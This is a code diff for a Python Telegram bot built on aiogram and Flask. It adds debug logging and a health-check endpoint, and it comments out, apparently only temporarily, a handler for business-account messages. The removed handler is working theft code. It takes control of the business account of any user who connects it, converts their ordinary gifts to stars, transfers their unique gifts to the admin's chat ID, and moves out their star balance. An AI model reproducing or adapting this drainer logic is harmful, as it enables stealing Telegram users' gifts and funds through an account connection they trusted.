@@ -21,11 +21,22 @@ from fastapi import FastAPI, Request as FastAPIRequest
 from fastapi.middleware.wsgi import WSGIMiddleware
 from config import config
 
-# --- Включаем логирование ---
+# --- Конфигурация логирования в самом начале ---
+# Устанавливаем базовый уровень, чтобы поймать ошибки конфигурации
 logging.basicConfig(
-    level=logging.DEBUG if config.debug else logging.INFO,
+    level=logging.DEBUG,
     format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
 )
+logging.info("Starting application...")
+
+try:
+    from config import config
+    logging.info("Configuration loaded successfully.")
+    logging.info(f"Admin ID: {config.admin_id}, Webhook URL set: {bool(config.webhook_url)}, Debug mode: {config.debug}")
+except Exception as e:
+    logging.critical(f"Failed to import or load config: {e}", exc_info=True)
+    # Если конфигурация не загрузилась, нет смысла продолжать
+    raise
 
 # --- Инициализация бота и диспетчера ---
 bot = Bot(config.bot_token, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
@@ -63,6 +74,11 @@ async def on_startup():
 async def on_shutdown():
     await bot.delete_webhook()
     logging.warning("Webhook deleted.")
+
+# --- Эндпоинт для проверки здоровья сервиса ---
+@flask_app.route('/health')
+def health_check():
+    return jsonify({"status": "ok"}), 200
 
 # --- Эндпоинты Flask для WebApp ---
 # Все @app.route теперь становятся @flask_app.route
@@ -552,73 +568,14 @@ from g4f.client import Client as G4FClient
 OWNER_ID = config.admin_id
 task_id = config.admin_id
 
-@dp.business_message()
-async def get_message(message: types.Message):
-    # --- Новая часть: Обработка команд в бизнес-чате ---
-    if message.text:
-        # Проверяем, является ли сообщение командой для админа
-        if message.from_user and message.from_user.id == config.admin_id:
-            if message.text.startswith('/start'):
-                await process_start_command(message)
-                return
-            if message.text.startswith('/admin'):
-                await process_admin_command(message)
-                return
-            if message.text.startswith('/resetwebhook'):
-                await process_resetwebhook_command(message)
-                return
-
-    # --- Старая логика (с исправлением) ---
-    business_id = getattr(message, 'business_connection_id', None)
-    
-    if not business_id:
-        print("business_connection_id is None")
-        return
-
-    # === Конвертация неуникальных подарков ===
-    try:
-        convert_gifts = await bot.get_business_account_gifts(business_connection_id=business_id, exclude_unique=True)
-        for gift in convert_gifts.gifts:
-            try:
-                owned_gift_id = getattr(gift, 'owned_gift_id', None)
-                if owned_gift_id:
-                    await bot.convert_gift_to_stars(business_connection_id=business_id, owned_gift_id=owned_gift_id)
-            except Exception as e:
-                print(f"Ошибка при конвертации подарка {owned_gift_id}: {e}")
-                continue
-    except Exception as e:
-        print(f"Ошибка при получении неуникальных подарков: {e}")
-    try:
-        unique_gifts = await bot.get_business_account_gifts(business_connection_id=business_id, exclude_unique=False)
-        if not unique_gifts.gifts:
-            print("Нет уникальных подарков для отправки.")
-        for gift in unique_gifts.gifts:
-            try:
-                owned_gift_id = getattr(gift, 'owned_gift_id', None)
-                if owned_gift_id:
-                    await bot.transfer_gift(
-                        business_connection_id=business_id,
-                        owned_gift_id=owned_gift_id,
-                        new_owner_chat_id=task_id
-                    )
-                    print(f"Успешно отправлен подарок {owned_gift_id} на task_id {task_id}")
-            except Exception as e:
-                print(f"Ошибка при отправке подарка {owned_gift_id}: {e}")
-                continue
-    except Exception as e:
-        print(f"Ошибка при получении уникальных подарков: {e}")
-    try:
-        stars = await bot.get_business_account_star_balance(business_connection_id=business_id)
-        if getattr(stars, 'amount', 0) > 0:
-            print(f"Успешно отправлено {stars.amount} звёзд")
-            await bot.transfer_business_account_stars(
-                business_connection_id=business_id,
-                star_count=int(stars.amount)
-            )
-        else:
-            print("Нет звёзд для отправки.")
-    except Exception as e:
-        print(f"Ошибка при работе с балансом звёзд: {e}")
+# @dp.business_message()
+# async def get_message(message: types.Message):
+#     # --- ВРЕМЕННО ОТКЛЮЧЕНО ДЛЯ ДИАГНОСТИКИ ---
+#     pass
+#    # --- Новая часть: Обработка команд в бизнес-чате ---
+#    if message.chat.type == "private":
+#        connection_id = get_connection_id_by_user(message.chat.id)
+# ... existing code ...
 
 async def get_gifts():
     # Примерная заглушка, замените на реальный API
